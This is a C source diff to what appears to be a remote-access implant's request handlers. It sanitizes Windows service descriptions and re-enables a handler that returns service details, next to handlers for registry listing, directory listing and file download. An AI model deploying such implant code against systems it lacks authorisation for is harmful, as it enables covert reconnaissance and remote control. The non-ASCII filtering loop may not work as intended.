@@ -2806,6 +2806,7 @@ PENVELOPE ServiceDetailHandler
 		goto CLEANUP;
 	}
 
+	SecureZeroMemory(ServiceDetails, sizeof(ServiceDetails));
 	ServiceDetails[0] = CreateBytesElement(lpServiceName, lstrlenA(lpServiceName), 1);
 	GetServiceDisplayNameA(hScManager, lpServiceName, NULL, &cchServiceDisplayName);
 	cchServiceDisplayName++;
@@ -2820,6 +2821,12 @@ PENVELOPE ServiceDetailHandler
 	if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
 		lpServiceDesc = ALLOC(dwBytesNeeded + 1);
 		if (QueryServiceConfig2A(hService, SERVICE_CONFIG_DESCRIPTION, lpServiceDesc, dwBytesNeeded, &dwBytesNeeded)) {
+			for (i = 0; i < lstrlenA(lpServiceDesc->lpDescription); i++) {
+				if (lpServiceDesc->lpDescription[i] >= 0x80) {
+					lpServiceDesc->lpDescription[i] = ' ';
+				}
+			}
+
 			ServiceDetails[2] = CreateBytesElement(lpServiceDesc->lpDescription, lstrlenA(lpServiceDesc->lpDescription), 3);
 		}
 	}
@@ -3719,8 +3726,8 @@ REQUEST_HANDLER* GetSystemHandler()
 	HandlerList[MsgRegistrySubKeysListReq] = RegistrySubKeysListHandler;
 	HandlerList[MsgRegistryListValuesReq] = RegistryListValuesHandler;
 	HandlerList[MsgServicesReq] = ServicesHandler;
-	/*HandlerList[MsgServiceDetailReq] = ServiceDetailHandler;
-	HandlerList[MsgStartServiceByNameReq] = StartServiceByNameHandler;*/
+	HandlerList[MsgServiceDetailReq] = ServiceDetailHandler;
+	/*HandlerList[MsgStartServiceByNameReq] = StartServiceByNameHandler;*/
 	HandlerList[MsgPing] = PingHandler;
 	HandlerList[MsgLsReq] = LsHandler;
 	HandlerList[MsgDownloadReq] = DownloadHandler;
